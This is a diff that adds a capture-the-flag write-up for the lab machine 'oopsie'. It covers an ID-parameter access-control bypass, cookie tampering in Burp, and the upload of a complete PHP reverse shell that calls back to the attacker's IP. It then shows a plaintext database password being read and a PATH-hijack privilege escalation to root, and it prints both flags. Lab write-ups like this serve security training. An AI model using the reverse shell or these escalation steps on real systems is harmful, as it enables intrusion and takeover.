@@ -14,16 +14,179 @@ Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
 
 Okay...So...We have to find a login page...so...Lets check the source code of the page, maybe we will find something...and this line looks promising:
 <script src="/cdn-cgi/login/script.js"></script>
-so check this page:
+
+So check this page:
 http://10.129.95.191/cdn-cgi/login/
+
 And we have a login page...AND!!! we can login as guest...
 Lets login as guest, and check the "account" page.
+
 In the URL we see this:
 http://10.129.*.*/cdn-cgi/login/admin.php?content=accounts&id=2
+
 Im wondering what if i change the id parameter to 1? And there is the admin's account page with the ID!!!
+
 Next task is to find out if i upload a file onto the server, what is the directory. So click on the Uploads menü, and inspect the page...:
 <a class="nav-link" href="/cdn-cgi/login/admin.php?content=uploads">Uploads</a></li>
 So probably our solution will be /uploads, which is the right answer...
+
 But the site send this message to us:
 "This action require super admin rights."
 So i was thinking...lets see this page in burpsuite...
+We have a GET request:
+GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
+Host: 10.129.*.*
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: user=2233; role=guest
+Connection: keep-alive
+
+To upload a file we need the superadmin ID...To get it we have to use Burpsuite's intruder
+So send the http://10.129.*.*/cdn-cgi/login/admin.php?content=accounts&id=1 webpage's GET request into the intruder, and add a payload to the id=1 part...
+Set the payload type to "Numbers" and from 0 to 100 lets run a Sniper attack...
+If you check the results it will pop up a result at id 30, which response is longer in this case...so check it in the browser, and there is the Super admin's ID!!!
+Now we have almost everything to get a shell...
+We have the right URL, the right ID, we only need the right payload:
+nano payload.php
+
+and copy into:
+<?php
+set_time_limit(0);
+$ip = '10.10.*.*';  // OUR IP
+$port = 4444;          // Port what will the netcat listen on
+
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/bash -i';
+$daemon = 0;
+$debug = 0;
+
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) { echo "$errstr ($errno)"; exit(1); }
+
+$descriptorspec = array(
+   0 => array("pipe", "r"),
+   1 => array("pipe", "w"),
+   2 => array("pipe", "w")
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+if (!is_resource($process)) { exit(1); }
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+while (1) {
+    if (feof($sock)) break;
+    if (feof($pipes[1])) break;
+    $read_a = array($sock, $pipes[1], $pipes[2]);
+    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+    if (in_array($sock, $read_a)) {
+        $input = fread($sock, $chunk_size);
+        fwrite($pipes[0], $input);
+    }
+    if (in_array($pipes[1], $read_a)) {
+        $input = fread($pipes[1], $chunk_size);
+        fwrite($sock, $input);
+    }
+    if (in_array($pipes[2], $read_a)) {
+        $input = fread($pipes[2], $chunk_size);
+        fwrite($sock, $input);
+    }
+}
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+?>
+save
+
+Turn intercept on (in Burpsuite), and open the uploads menu again, change the credentials, select the file, after clicked on the upload button again change the request credentials, and we've uploaded our payload!!!
+Open a terminal and copy:
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444 
+
+After this, into the browser:
+http://10.129.*.*/uploads/payload.php
+
+And we have a reverse shell!
+
+Since its not a 'normal'shell type this:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Then press ctrl+Z and type:
+stty raw -echo; fg (maybe we have to type 2 times)
+
+After we got back the shell, type this blindly: reset
+then: xterm
+
+And we are done...
+Let get the flags...
+
+www-data@oopsie:/var/www/html/uploads$ cd /home/
+www-data@oopsie:/home$ ls
+robert
+www-data@oopsie:/home$ cd robert
+www-data@oopsie:/home/robert$ ls
+user.txt
+www-data@oopsie:/home/robert$ cat user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+www-data@oopsie:/home/robert$ 
+
+Next task is root flag...this one is much more trickier...
+
+Earlier in the tab there was a question about '-group bugtracer'. We will use it here:
+www-data@oopsie:/home/robert$ find / -group bugtracker 2>/dev/null
+/usr/bin/bugtracker
+Move back to the original directory...and check roberts credentials...
+www-data@oopsie:/var/www/html/cdn-cgi/login$ /bin/cat /var/www/html/cdn-cgi/login/db.php
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+Login az Robert:
+www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
+Password: 
+robert@oopsie:/var/www/html/cdn-cgi/login$ 
+
+Then to get to the root directory, we have to create a malicious binary...:
+robert@oopsie:/$ export PATH=/tmp:$PATH
+robert@oopsie:/$ cd /tmp/
+robert@oopsie:/tmp$ echo '/bin/sh' > cat
+robert@oopsie:/tmp$ chmod +x cat
+
+After this Use the Bugtracker:
+robert@oopsie:/tmp$ /usr/bin/bugtracker 
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1
+---------------
+
+# id
+uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+#
+
+So we have Root privileges now. Move to the desired directory and get the flag:
+# ls
+cat
+# cd ..
+# ls
+bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
+boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
+cdrom  home  lib             media       proc  sbin  sys   var
+# cd root
+# ls
+reports  root.txt
+# /bin/cat /root/root.txt
+af13b0bee69f8a877c3faf667f7beacf
+# 
+
